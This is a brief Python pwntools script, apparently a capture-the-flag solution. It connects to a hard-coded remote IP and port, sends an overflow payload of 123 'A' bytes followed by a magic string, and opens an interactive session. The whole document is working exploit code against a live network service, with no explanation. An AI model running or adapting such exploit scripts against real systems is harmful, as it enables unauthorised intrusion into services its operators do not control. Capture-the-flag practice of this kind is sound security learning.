from pwn import*
p = remote('47.103.214.163',20000)
p.recv()
payload = 'A'*123+ '0O0o\x00O0\x00'
p.sendline(payload)
p.interactive()
